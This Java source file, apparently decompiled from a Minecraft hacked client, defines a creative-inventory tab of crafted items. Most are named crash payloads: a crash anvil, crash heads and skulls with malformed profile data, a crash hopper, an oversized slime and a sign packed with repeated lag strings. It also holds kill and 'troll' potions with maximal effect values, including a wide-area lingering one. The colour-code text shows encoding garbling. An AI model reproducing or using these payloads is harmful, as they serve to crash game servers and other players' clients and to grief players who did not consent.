package Method.Client.utils.Creativetabs;

import net.minecraft.creativetab.*;
import net.minecraft.enchantment.*;
import net.minecraft.util.*;
import net.minecraft.inventory.*;
import net.minecraft.item.*;
import net.minecraft.init.*;
import com.mojang.authlib.*;
import java.util.*;
import com.mojang.authlib.properties.*;
import net.minecraft.client.*;
import net.minecraft.block.*;
import net.minecraft.nbt.*;

public class CreativeTabFun extends CreativeTabs
{
    ItemStack Blankspot;
    ArrayList<Enchantment> Enchants;
    ArrayList<Integer> Levels;
    
    public CreativeTabFun() {
        super("Fun");
        this.Blankspot = new ItemStack(Items.field_151118_aC);
        this.Enchants = new ArrayList<Enchantment>();
        this.Levels = new ArrayList<Integer>();
    }
    
    public String func_78013_b() {
        return "Fun";
    }
    
    public void func_78018_a(final NonNullList<ItemStack> itemList) {
        this.Blankspot.func_190920_e(-1);
        try {
            Creativetabhelper.Attributeitems(Items.field_151130_bT, this.Enchants, this.Levels, itemList, EntityEquipmentSlot.HEAD, false);
            Creativetabhelper.Attributeitems(Items.field_151130_bT, this.Enchants, this.Levels, itemList, EntityEquipmentSlot.OFFHAND, false);
            final ItemStack trollPotion = new ItemStack((Item)Items.field_185155_bH);
            trollPotion.func_77964_b(16395);
            final NBTTagList trollPotionEffects = new NBTTagList();
            for (int i = 1; i <= 27; ++i) {
                final NBTTagCompound effect = new NBTTagCompound();
                effect.func_74768_a("Amplifier", Integer.MAX_VALUE);
                effect.func_74768_a("Duration", Integer.MAX_VALUE);
                effect.func_74768_a("Id", i);
                trollPotionEffects.func_74742_a((NBTBase)effect);
            }
            trollPotion.func_77983_a("CustomPotionEffects", (NBTBase)trollPotionEffects);
            trollPotion.func_151001_c("\u00c2§c\u00c2§lTroll\u00c2§6\u00c2§lPotion");
            itemList.add((Object)trollPotion);
            final ItemStack killPotion = new ItemStack((Item)Items.field_185155_bH);
            killPotion.func_77964_b(16395);
            final NBTTagCompound effect = new NBTTagCompound();
            effect.func_74768_a("Amplifier", 125);
            effect.func_74768_a("Duration", 1);
            effect.func_74768_a("Id", 6);
            final NBTTagList effects = new NBTTagList();
            effects.func_74742_a((NBTBase)effect);
            killPotion.func_77983_a("CustomPotionEffects", (NBTBase)effects);
            killPotion.func_151001_c("\u00c2§c\u00c2§lKill\u00c2§6\u00c2§lPotion");
            itemList.add((Object)killPotion);
            final ItemStack crashAnvil = new ItemStack(Blocks.field_150467_bQ);
            crashAnvil.func_151001_c("\u00c2§8Crash\u00c2§c\u00c2§lAnvil \u00c2§7| \u00c2§cmc1.8-mc1.8");
            crashAnvil.func_77964_b(16384);
            itemList.add((Object)crashAnvil);
            final ItemStack crashHead = new ItemStack(Items.field_151144_bL);
            final NBTTagCompound compound = new NBTTagCompound();
            compound.func_74778_a("SkullOwner", " ");
            crashHead.func_77982_d(compound);
            crashHead.func_151001_c("\u00c2§8Crash\u00c2§6\u00c2§lHead \u00c2§7| \u00c2§cmc1.8-mc1.10");
            itemList.add((Object)crashHead);
            final ItemStack Armorstand = new ItemStack((Item)Items.field_179565_cj);
            Armorstand.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}"));
            itemList.add((Object)Armorstand);
            final ItemStack Armorstand2 = new ItemStack((Item)Items.field_179565_cj);
            Armorstand2.func_151001_c("\u00c2§c\u00c2§lArmor stand++");
            Armorstand2.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{NoBasePlate:1,ShowArms:1}}"));
            itemList.add((Object)Armorstand2);
            final ItemStack InstaCreeper = new ItemStack(Items.field_151063_bx);
            InstaCreeper.func_151001_c("\u00c2§c\u00c2§lInsta Creeper");
            InstaCreeper.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{Fuse:-1,id:\"minecraft:creeper\",ignited:1,ExplosionRadius:127}}"));
            itemList.add((Object)InstaCreeper);
            final ItemStack CrashSlime = new ItemStack(Items.field_151063_bx);
            CrashSlime.func_151001_c("\u00c2§c\u00c2§lCrash Slime");
            CrashSlime.func_77982_d(JsonToNBT.func_180713_a("{EntityTag:{Size:32767,id:\"minecraft:slime\"}}"));
            itemList.add((Object)CrashSlime);
            final ItemStack Firework = new ItemStack(Items.field_151152_bP);
            Firework.func_151001_c("\u00c2§c\u00c2§lLong Firework");
            Firework.func_77982_d(JsonToNBT.func_180713_a("{Fireworks:{Flight:127,Explosions:[{Type:0,Trail:1b,Colors:[I;16711680],FadeColors:[I;16711680]}]}}"));
            itemList.add((Object)Firework);
            final ItemStack Fwork = new ItemStack(Items.field_151152_bP);
            Fwork.func_77982_d(JsonToNBT.func_180713_a("{Fireworks:{Flight:3}}"));
            itemList.add((Object)Fwork);
            final ItemStack CrashSkull = new ItemStack(Item.func_150899_d(397), 1, 3);
            final NBTTagCompound nbt = new NBTTagCompound();
            final NBTTagCompound c = new NBTTagCompound();
            final GameProfile prof = new GameProfile((UUID)null, "name");
            prof.getProperties().put((Object)"textures", (Object)new Property("Value", "eyJ0ZXh0\u00addXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0="));
            c.func_74778_a("Id", "9d744c33-f3c4-4040-a7fc-73b47c840f0c");
            NBTUtil.func_180708_a(c, prof);
            nbt.func_74782_a("SkullOwner", (NBTBase)c);
            nbt.func_74757_a("crash", true);
            CrashSkull.field_77990_d = nbt;
            CrashSkull.func_151001_c("Hold me :D");
            itemList.add((Object)CrashSkull);
            final ItemStack Head = new ItemStack(Item.func_150899_d(397), 1, 3);
            Head.func_77983_a("SkullOwner", (NBTBase)new NBTTagString(Minecraft.func_71410_x().field_71439_g.func_70005_c_()));
            itemList.add((Object)Head);
            final ItemStack Crashhopper = new ItemStack((Block)Blocks.field_150438_bZ);
            Crashhopper.func_151001_c("\u00c2§c\u00c2§lCrash hopper");
            Crashhopper.func_77982_d(JsonToNBT.func_180713_a("{BlockEntityTag:{Items:[{Slot:0,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\"}}}]}}"));
            itemList.add((Object)Crashhopper);
            final ItemStack Potion = new ItemStack((Item)Items.field_185155_bH);
            Potion.func_77982_d(JsonToNBT.func_180713_a("{CustomPotionEffects:[{Duration:20,Id:6,Amplifier:253}]}"));
            itemList.add((Object)Potion);
            final ItemStack Linger = new ItemStack((Item)Items.field_185156_bI);
            Linger.func_77982_d(JsonToNBT.func_180713_a("{CustomPotionEffects:[{Radius:100,Duration:20,Id:6,Amplifier:253}],HideFlags:32}"));
            itemList.add((Object)Linger);
            final StringBuilder lagStringBuilder = new StringBuilder();
            for (int j = 0; j < 500; ++j) {
                lagStringBuilder.append("/(!\u00c2§()%/\u00c2§)=/(!\u00c2§()%/\u00c2§)=/(!\u00c2§()%/\u00c2§)=");
            }
            final ItemStack sign = new ItemStack(Items.field_151155_ap);
            sign.func_151001_c("\u00c2§c\u00c2§lCrash sign");
            sign.func_77982_d(JsonToNBT.func_180713_a("{BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text2:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text3:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\",Text4:\"{\\\"text\\\":\\\"" + lagStringBuilder.toString() + "\\\"}\"}}"));
            itemList.add((Object)sign);
            final ItemStack spawn = new ItemStack(Items.field_151057_cb);
            spawn.func_77982_d(JsonToNBT.func_180713_a("{display:{Name: \"" + lagStringBuilder.toString() + "\"}}"));
            itemList.add((Object)spawn);
        }
        catch (NBTException e) {
            e.printStackTrace();
        }
        super.func_78018_a((NonNullList)itemList);
    }
    
    public ItemStack func_78016_d() {
        return new ItemStack(Items.field_151142_bV);
    }
}
